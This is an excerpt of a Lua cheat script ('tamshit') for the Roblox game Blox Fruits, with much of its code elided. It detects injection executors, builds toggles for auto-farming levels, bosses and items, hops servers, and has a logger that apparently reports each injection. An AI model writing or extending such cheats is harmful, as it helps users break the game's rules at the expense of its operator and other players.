local status, err = pcall(function()
    ...
    if BF == true then
        ...
        function sendLogger()
            ...
            local Embed = {
                ["title"] = "Кто-то заинжектил tamshit",
        ...
        if _G.tamshitLoaded == 1 then
            Notification("Another instance of tamshit already loaded")
            print("Another instance of tamshit already loaded")
            return
        end

        local SettingsFile = "tamshitUI.json"
        ...
        function WriteSettings()
            writefile(SettingsFile, game:GetService('HttpService'):JSONEncode(getgenv().tamshitSettings))
        end
        ...
        getgenv().tamshitSettings = DefaultSettings
        settings = LoadSettings()
        if settings then
            for i,v in pairs(settings) do
                getgenv().tamshitSettings[i] = v
            end 
        end
        WriteSettings()
            ...
            repeat wait() 
                if fluxus or arceus or delta or codex then
                    if game.Players.LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                        if getgenv().tamshitSettings['Team'] then
                            if getgenv().tamshitSettings['Team'] == "Pirate" then
                            ...
                            elseif getgenv().tamshitSettings['Team'] == "Marine" then
        ...
        if getgenv().tamshitSettings["Select Weapon"] then
            _G.SelectWeapon = getgenv().tamshitSettings["Select Weapon"]
        else
        ...
        notis.new("<Color=Red>tamshit<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>tamshit<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>tamshit<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        print("tamshit Loaded Successfully")
                    ...
                    if BringMobFarm then
                        ...
                        if second_sea then
                            if GetIsLand(LP.Character.HumanoidRootPart.CFrame) == "Ship" then
                                ...
                                if getgenv().tamshitSettings["Auto Rengoku"] then
                                    range = 200
                                else
                                    range = 300
                                end
        ...
        game:GetService("GuiService").ErrorMessageChanged:Connect(function(err)
            if _G.AutoFarmLevel or _G.AutoRejoinServer or getgenv().tamshitSettings['Auto Rejoin'] then 
        ...
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Rengoku"] and not isWeaponInInventory("Rengoku") then
                        if not LP.Backpack:FindFirstChild("Hidden Key") then
                            if getgenv().tamshitSettings["Auto Rengoku Hop"] then
                                    ...
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                ...
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().tamshitSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
        ...
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Kill Darkbeard"] and second_sea then
                            ...
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    ...
                                    repeat task.wait()
                                        ...
                                        RenPos = v.HumanoidRootPart.CFrame
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().tamshitSettings["Auto Kill Darkbeard"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
        ...
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Ghoul Race"] and second_sea then
                            ...
                            if not isItemInEquip("Hellfire Torch") then
                                    ...
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health <= 0 then 
                                            ...
                                            repeat task.wait()
                                                ...
                                                MonName = v.Name
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().tamshitSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif game.ReplicatedStorage:FindFirstChild("Cursed Captain") then
                                    ...
                                    if GetMaterial("Ectoplasm") < 100 then
                                        ...
                                        if getgenv().tamshitSettings["Auto Ghoul Race Hop"] and not _G.HopLowestActivated then 
                                            HopToLowestServer() 
                                        end
                                    end
                                end
        ...
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Factory"] and second_sea then
                            ...
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    ...
                                    repeat task.wait()
                                        ...
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().tamshitSettings["Auto Factory"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Core") then
                            ...
                            if getgenv().tamshitSettings["Auto Factory Hop"] then
                                HopServer()
                            end
                        end
                    end
        ...
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Swan Glasses"] then
                        AutoDonSwan = true
                    else
                        AutoDonSwan = false
                    end
                    if getgenv().tamshitSettings["Swan Glasses Hop"] then
                        AutoDonSwanHop = true
                    else
                            ...
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    ...
                                    repeat task.wait()
                                        ...
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().tamshitSettings["Farm Water Key"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
        ...
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Gravity Cane"] and not isWeaponInInventory("Gravity Cane") and second_sea then
                            ...
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    ...
                                    repeat task.wait()
                                        ...
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().tamshitSettings["Gravity Cane"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Fajita") then
                            ...
                            if getgenv().tamshitSettings["Gravity Cane Hop"] then 
                                HopServer()
                            end
                        end
                    end
            ...
            while wait(1) do
                pcall(function()
                    if _G.FastSpeed then
                        getgenv().tamshitSettings['Fast Speed'] = _G.FastSpeed
                        WriteSettings()
                    end
                end)
            end
        ...
        _G.FastSpeed = getgenv().tamshitSettings['Fast Speed'] or 0.2

        autoFarmLevel = MainFarmSection:NewToggle("Auto Farm Level", function(state)
            _G.AutoFarmLevel = state
            getgenv().tamshitSettings['Auto Farm Level'] = state
            WriteSettings()
        end)
        if _G.AutoFarmLevel or getgenv().tamshitSettings['Auto Farm Level'] then autoFarmLevel:UpdateToggle(nil, true) end
        
        MaxLevelDropdown = MainFarmSection:NewDropdown("Max Level", {"0", "700", "1500", "2550"}, function(choice)
            getgenv().tamshitSettings['Max Level'] = tonumber(choice)
            WriteSettings()
        end)
        if getgenv().tamshitSettings['Max Level'] then
            _G.MaxLevel = getgenv().tamshitSettings['Max Level']
            MaxLevelDropdown:UpdateSelect(tostring(getgenv().tamshitSettings['Max Level']))
        end
            ...
            spawn(function()
                ...
                while wait() do
                    ...
                    if doneLeveling then
                        ...
                        getgenv().tamshitSettings['Auto Rejoin'] = false
                        wait(.2)
                        st, err = pcall(function()
                            h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                            m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
        ...
        _G.SelectWeapon = _G.SelectWeapon or getgenv().tamshitSettings["Select Weapon"] or "Melee"
        WeaponDropdown = MainFarmSection:NewDropdown("Select Weapon", {"Melee", "Sword", "Fruit"}, function(currentOption)
            getgenv().tamshitSettings["Select Weapon"] = currentOption
            WriteSettings()
            _G.SelectWeapon = currentOption
        end)
        if getgenv().tamshitSettings["Select Weapon"] then
            WeaponDropdown:UpdateSelect(getgenv().tamshitSettings["Select Weapon"])
        end
        ...
        if second_sea then
            ...
            FarmEctoplasmToggle = FarmSection:NewToggle("Farm Ectoplasm", function(state)
                getgenv().tamshitSettings["Farm Ectoplasm"] = state
                WriteSettings()
                FarmEctoplasm = state
            end)
            if getgenv().tamshitSettings["Farm Ectoplasm"] then FarmEctoplasmToggle:UpdateToggle(nil, true) end
        end
        if third_sea then
            ...
            FarmBonesToggle = FarmSection:NewToggle("Farm Bones", function(state)
                getgenv().tamshitSettings["Farm Bones"] = state
                WriteSettings()
                FarmBones = state
            end)
            if getgenv().tamshitSettings["Farm Bones"] then FarmBonesToggle:UpdateToggle(nil, true) end
            FarmBonesToggleWithQuest = FarmSection:NewToggle("With Quest", function(state)
                getgenv().tamshitSettings["Farm Bones With Quest"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Bones With Quest"] then FarmBonesToggleWithQuest:UpdateToggle(nil, true) end
        end
        ...
        spawn(function()
            while task.wait() do
                if (FarmBones or FarmBonesCDK or FarmBonesGH) and third_sea then
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Bones With Quest"] and not LP.PlayerGui.Main.Quest.Visible then
        ...
        if first_sea or second_sea or third_sea then
            ...
            AutoSoulGuitar = MiscFarmItemsSection:NewToggle("Auto Soul Guitar [Need only Dark Fragment]", function(value)
                getgenv().tamshitSettings["Auto Soul Guitar"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Soul Guitar"] then AutoSoulGuitar:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Soul Guitar"] then _G.AutoSoulGuitar = true else _G.AutoSoulGuitar = false end
                    end)
                end
            end)
                        ...
                        if _G.AutoSoulGuitar and not isWeaponInInventory("Soul Guitar") then
                            if GetMaterial("Ectoplasm") < 250 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().tamshitSettings["killaura"] = false
                                    getgenv().tamshitSettings["autonextisland"] = false
                                    getgenv().tamshitSettings["autostartraid"] = false
                                    getgenv().tamshitSettings["autotradejunk"] = false
                                    getgenv().tamshitSettings["autobuychip"] = false
                                    getgenv().tamshitSettings["maxfrag"] = 0
                                    getgenv().tamshitSettings["enabledmaxfrag"] = false
                                end
                            ...
                            elseif LP.Data.Fragments.Value < 5000 and not isWeaponInInventory("Soul Guitar") then
                                ...
                                getgenv().tamshitSettings["killaura"] = true
                                getgenv().tamshitSettings["autonextisland"] = true
                                getgenv().tamshitSettings["autostartraid"] = true
                                getgenv().tamshitSettings["autotradejunk"] = true
                                getgenv().tamshitSettings["autobuychip"] = true
                                getgenv().tamshitSettings["maxfrag"] = 5000
                                getgenv().tamshitSettings["enabledmaxfrag"] = true
                            else
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().tamshitSettings["killaura"] = false
            ...
            AutoGodhuman = MiscFarmItemsSection:NewToggle("Auto Godhuman [Farm frags before]", function(state)
                getgenv().tamshitSettings["Auto Godhuman"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Godhuman"] then AutoGodhuman:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Godhuman"] then _G.AutoGodhuman = true else _G.AutoGodhuman = false end
                    end)
                end
            end)
            ...
            AutoTTKMastery = MiscFarmItemsSection:NewToggle("Auto Farm Mastery TTK Swords", function(state)
                getgenv().tamshitSettings["Auto Farm Mastery TTK Swords"] = state
                WriteSettings()
            end)

            if getgenv().tamshitSettings["Auto Farm Mastery TTK Swords"] then AutoTTKMastery:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Farm Mastery TTK Swords"] and not isWeaponInInventory("True Triple Katana") then _G.AutoTTKMastery = true else _G.AutoTTKMastery = false end
                    end)
                end
            end)
            spawn(function()
            ...
            FarmBosses = MiscFarmItemsSection:NewToggle("Farm All Bosses", function(state)
                getgenv().tamshitSettings["Farm All Bosses"] = state
                WriteSettings()
            end)

            if getgenv().tamshitSettings["Farm All Bosses"] then FarmBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm All Bosses"] then _G.FarmBosses = true else _G.FarmBosses = false end
                    end)
                end
            end)

            HopIfNoBosses = MiscFarmItemsSection:NewToggle("Hop If No Bosses", function(state)
                getgenv().tamshitSettings["Hop If No Bosses"] = state
                WriteSettings()
            end)

            if getgenv().tamshitSettings["Hop If No Bosses"] then HopIfNoBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Hop If No Bosses"] then _G.HopIfNoBosses = true else _G.HopIfNoBosses = false end
                    end)
                end
            end)
        ...
        if first_sea then
            ...
            AutoPole1st = Sea1ItemsSection:NewToggle("Auto Pole 1st Form", function(state)
                getgenv().tamshitSettings["Auto Pole 1st Form"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Pole 1st Form"] then AutoPole1st:UpdateToggle(nil, true) end
            AutoPole1stHop = Sea1ItemsSection:NewToggle("Auto Pole 1st Form Hop", function(state)
                getgenv().tamshitSettings["Auto Pole 1st Form Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Pole 1st Form Hop"] then AutoPole1stHop:UpdateToggle(nil, true) end
            Sea1ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Pole 1st Form"] and not isWeaponInInventory("Pole (1st Form)") then _G.AutoPole1st = true else _G.AutoPole1st = false end
                    end)
                end
            end)
            spawn(function()
                    ...
                    pcall(function()
                        if _G.AutoPole1st and first_sea then
                            ...
                            elseif game.ReplicatedStorage:FindFirstChild("Thunder God") and game.ReplicatedStorage:FindFirstChild("Thunder God"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Thunder God").Humanoid.Health > 0 then
                                ...
                                if getgenv().tamshitSettings["Auto Pole 1st Form Hop"] then
                                    HopServer()
                                end
                            end
                        end
        ...
        if second_sea then
            ...
            FarmFangs = Sea2MaterialsSection:NewToggle("Farm Vampire Fang", function(state)
                getgenv().tamshitSettings["Farm Vampire Fang"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Vampire Fang"] then FarmFangs:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Vampire Fang"] then _G.FarmFangs = true else _G.FarmFangs = false end
                    end)
                end
            end)
            spawn(function()
            ...
            AutoBartiloToggle = Sea2ItemsSection:NewToggle("Auto Bartilo Quest", function(state)
                getgenv().tamshitSettings["Auto Bartilo Quest"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Bartilo Quest"] then AutoBartiloToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Bartilo Quest"] then AutoBartilo = true else AutoBartilo = false end
                    end)
                end
            end)
            ...
            AutoSea3Toggle = Sea2ItemsSection:NewToggle("Auto Open Sea 3", function(state)
                getgenv().tamshitSettings["Auto Open Sea 3"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Open Sea 3"] then AutoSea3Toggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Open Sea 3"] then AutoSea3 = true else AutoSea3 = false end
                    end)
                end
            end)
            ...
            AutoFactory = Sea2ItemsSection:NewToggle("Auto Factory", function(state)
                getgenv().tamshitSettings["Auto Factory"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Factory"] then AutoFactory:UpdateToggle(nil, true) end
            AutoFactoryHop = Sea2ItemsSection:NewToggle("Auto Factory Hop [Farm only boss then]", function(state)
                getgenv().tamshitSettings["Auto Factory Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Factory Hop"] then AutoFactoryHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Darkbeard
            AutoKillDarkbeard = Sea2ItemsSection:NewToggle("Auto Kill Darkbeard", function(state)
                getgenv().tamshitSettings["Auto Kill Darkbeard"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Kill Darkbeard"] then AutoKillDarkbeard:UpdateToggle(nil, true) end
            ...
            AutoGhoulRace = Sea2ItemsSection:NewToggle("Auto Ghoul Race", function(state)
                getgenv().tamshitSettings["Auto Ghoul Race"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Ghoul Race"] then AutoGhoulRace:UpdateToggle(nil, true) end
            AutoGhoulRaceHop = Sea2ItemsSection:NewToggle("Auto Ghoul Race Hop", function(state)
                getgenv().tamshitSettings["Auto Ghoul Race Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Ghoul Race Hop"] then AutoGhoulRaceHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====

            AutoRengoku = Sea2ItemsSection:NewToggle("Auto Rengoku", function(state)
                getgenv().tamshitSettings["Auto Rengoku"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Rengoku"] then AutoRengoku:UpdateToggle(nil, true) end
            AutoRengokuHop = Sea2ItemsSection:NewToggle("Auto Rengoku Hop [Farm only boss then]", function(state)
                getgenv().tamshitSettings["Auto Rengoku Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Rengoku Hop"] then AutoRengokuHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoKillTideKeeper = Sea2ItemsSection:NewToggle("Farm Water Key", function(state)
                getgenv().tamshitSettings["Farm Water Key"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Water Key"] then AutoKillTideKeeper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Water Key"] then FarmWaterKey = true else FarmWaterKey = false end
                    end)
                end
            end)
            AutoKillTideKeeperHop = Sea2ItemsSection:NewToggle("Farm Water Key Hop", function(state)
                getgenv().tamshitSettings["Farm Water Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Water Key Hop"] then AutoKillTideKeeperHop:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Water Key Hop"] then FarmWaterKeyHop = true else FarmWaterKeyHop = false end
                    end)
                end
            end)

            FarmLibraryKeyToggle = Sea2ItemsSection:NewToggle("Farm Library Key", function(state)
                getgenv().tamshitSettings["Farm Library Key"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Library Key"] then FarmLibraryKeyToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Library Key"] then FarmLibraryKey = true else FarmLibraryKey = false end
                    end)
                end
            end)
            FarmLibraryKeyHopToggle = Sea2ItemsSection:NewToggle("Farm Library Key Hop", function(state)
                getgenv().tamshitSettings["Farm Library Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Library Key Hop"] then FarmLibraryKeyHopToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Library Key Hop"] then FarmLibraryKeyHop = true else FarmLibraryKeyHop = false end
                    end)
                end
            end)
            ...
            AutoSwanGlasses = Sea2ItemsSection:NewToggle("Swan Glasses [Must Be Swan Room Opened]", function(state)
                getgenv().tamshitSettings["Swan Glasses"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Swan Glasses"] then AutoSwanGlasses:UpdateToggle(nil, true) end
            AutoSwanGlassesHop = Sea2ItemsSection:NewToggle("Swan Glasses Hop", function(state)
                getgenv().tamshitSettings["Swan Glasses Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Swan Glasses Hop"] then AutoSwanGlassesHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoGravityCane = Sea2ItemsSection:NewToggle("Auto Gravity Cane", function(state)
                getgenv().tamshitSettings["Gravity Cane"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Gravity Cane"] then AutoGravityCane:UpdateToggle(nil, true) end
            AutoGravityCaneHop = Sea2ItemsSection:NewToggle("Auto Gravity Cane Hop", function(state)
                getgenv().tamshitSettings["Gravity Cane Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Gravity Cane Hop"] then AutoGravityCaneHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            ...
            autostartorder1 = Sea2ItemsSection:NewToggle("Auto Start Order", function(state)
                ...
                getgenv().tamshitSettings['AutoStartOrder'] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings['AutoStartOrder'] then autostartorder1:UpdateToggle(nil, true) end
            ...
            autostartorder2 = Sea2ItemsSection:NewToggle("Auto Start Order With Teammates", function(state)
                ...
                getgenv().tamshitSettings['AutoStartOrderWithTeammates'] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings['AutoStartOrderWithTeammates'] then autostartorder2:UpdateToggle(nil, true) end
            ...
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Self Mode ]", function(state)
                getgenv().tamshitSettings['Auto Cyborg Race Self'] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings['Auto Cyborg Race Self'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings['Auto Cyborg Race Self'] then
            ...
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Teammate Mode ]", function(state)
                getgenv().tamshitSettings['Auto Cyborg Race Teammate'] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings['Auto Cyborg Race Teammate'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings['Auto Cyborg Race Teammate'] then
            ...
            TeammateCellDropdown = Sea2ItemsSection:NewDropdown("Teammate Cell", {"1", "2", "3", "4"}, function(selected)
                ...
                getgenv().tamshitSettings["Teammate Cell"] = selected
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Teammate Cell"] then
                TeammateCellDropdown:UpdateSelect(getgenv().tamshitSettings["Teammate Cell"])
            else
        ...
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings['AutoStartOrder'] then
                    ...
                    elseif getgenv().tamshitSettings['AutoStartOrderWithTeammates'] then
        ...
        if third_sea then
            ...
            FarmCocoa = Sea3MaterialsSection:NewToggle("Farm Conjured Cocoa", function(state)
                getgenv().tamshitSettings["Farm Conjured Cocoa"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Conjured Cocoa"] then FarmCocoa:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Conjured Cocoa"] then _G.FarmCocoa = true else _G.FarmCocoa = false end
                    end)
                end
            end)
            spawn(function()
            ...
            FarmDragonScale = Sea3MaterialsSection:NewToggle("Farm Dragon Scale", function(state)
                getgenv().tamshitSettings["Farm Dragon Scale"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Dragon Scale"] then FarmDragonScale:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Dragon Scale"] then _G.FarmDragonScale = true else _G.FarmDragonScale = false end
                    end)
                end
            end)
            spawn(function()
            ...
            FarmDemonicWisp = Sea3MaterialsSection:NewToggle("Farm Demonic Wisp", function(state)
                getgenv().tamshitSettings["Farm Demonic Wisp"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Demonic Wisp"] then FarmDemonicWisp:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Demonic Wisp"] then _G.FarmDemonicWisp = true else _G.FarmDemonicWisp = false end
                    end)
                end
            end)
            spawn(function()
            ...
            AutoKillSoulReaper = Sea3ItemsSection:NewToggle("Auto Kill Soul Reaper", function(state)
                getgenv().tamshitSettings["Auto Kill Soul Reaper"] = state
                WriteSettings()
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Kill Soul Reaper"] and (workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper")) then _G.AutoSoulReaper = true else _G.AutoSoulReaper = false end
                    end)
                end
            end)
            spawn(function()
            ...
            AutoSpawnSoulReaper = Sea3ItemsSection:NewToggle("Auto Spawn Soul Reaper", function(state)
                getgenv().tamshitSettings["Auto Spawn Soul Reaper"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Spawn Soul Reaper"] then AutoSpawnSoulReaper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Spawn Soul Reaper"] and  isItemInEquip("Hallow Essence") then
            ...
            AutoCanvander = Sea3ItemsSection:NewToggle("Auto Canvander", function(state)
                getgenv().tamshitSettings["Auto Canvander"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Canvander"] then AutoCanvander:UpdateToggle(nil, true) end
            AutoCanvanderHop = Sea3ItemsSection:NewToggle("Auto Canvander Hop", function(state)
                getgenv().tamshitSettings["Auto Canvander Hop"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Canvander Hop"] then AutoCanvanderHop:UpdateToggle(nil, true) end
            Sea3ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Canvander"] and not isWeaponInInventory("Canvander") then _G.AutoCanvander = true else _G.AutoCanvander = false end
                    end)
                end
            end)
            spawn(function()
                    ...
                    pcall(function()
                        if _G.AutoCanvander and third_sea then
                            ...
                            elseif game.ReplicatedStorage:FindFirstChild("Beautiful Pirate") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate").Humanoid.Health > 0 then
                                ...
                                if getgenv().tamshitSettings["Auto Canvander Hop"] then
                                    HopServer()
                                end
                            end
                        end
            ...
            killIndra = Sea3ItemsSection:NewToggle("Kill Indra", function(value)
                getgenv().tamshitSettings["Kill Indra"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Kill Indra"] then killIndra:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Kill Indra"] then
                            _G.KillIndra = true
                        else
                            _G.KillIndra = false
                        end
            ...
            AutoYamaToggle = Sea3ItemsSection:NewToggle("Auto Yama", function(state)
                getgenv().tamshitSettings["Auto Yama"] = state
                WriteSettings()
                AutoYama = state
            end)
            AutoYamaHopToggle = Sea3ItemsSection:NewToggle("Auto Yama Hop [Must have]", function(state)
                getgenv().tamshitSettings["Auto Yama Hop"] = state
                WriteSettings()
                AutoYamaHop = state
            end)
            if getgenv().tamshitSettings["Auto Yama"] or AutoYama then AutoYamaToggle:UpdateToggle(nil, true) end
            if getgenv().tamshitSettings["Auto Yama Hop"] or AutoYamaHop then AutoYamaHopToggle:UpdateToggle(nil, true) end

            AutoTushita = false
            AutoTushitaToggle = Sea3ItemsSection:NewToggle("Auto Tushita", function(state)
                getgenv().tamshitSettings["Auto Tushita"] = state
                WriteSettings()
                
            end)
            if getgenv().tamshitSettings["Auto Tushita"] then AutoTushitaToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Tushita"] and not isWeaponInInventory("Tushita") then
                            AutoTushita = true
                        else
                            AutoTushita = false
                        end
            ...
            AutoCDKToggle = Sea3ItemsSection:NewToggle("Auto Cursed Dual Katana", function(value)
                getgenv().tamshitSettings["AutoCDK"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["AutoCDK"] then AutoCDKToggle:UpdateToggle(nil, true) end
            ...
            farmDough = Sea3ItemsSection:NewToggle("Farm Mobs for Spawn", function(value)
                getgenv().tamshitSettings["Farm Dough"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Farm Dough"] then farmDough:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Farm Dough"] and not isDoughSpawned() then
                            _G.FarmDough = true
                        else
                            _G.FarmDough = false
                        end
            ...
            autoSpawnDough = Sea3ItemsSection:NewToggle("Auto Spawn Dough/Cake Boss", function(value)
                getgenv().tamshitSettings["Auto Spawn Dough"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Spawn Dough"] then autoSpawnDough:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        local MobsLeft
                        if getgenv().tamshitSettings["Auto Spawn Dough"] then
            ...
            killDough = Sea3ItemsSection:NewToggle("Kill Dough King / Cake Prince", function(value)
                getgenv().tamshitSettings["Kill Dough"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Kill Dough"] then killDough:UpdateToggle(nil, true) end
            killOnlyDough = Sea3ItemsSection:NewToggle("Kill ONLY Dough King", function(value)
                getgenv().tamshitSettings["kill Only Dough"] = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["kill Only Dough"] then killOnlyDough:UpdateToggle(nil, true) end

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Kill Dough"] then
                            if getgenv().tamshitSettings["kill Only Dough"] then
            ...
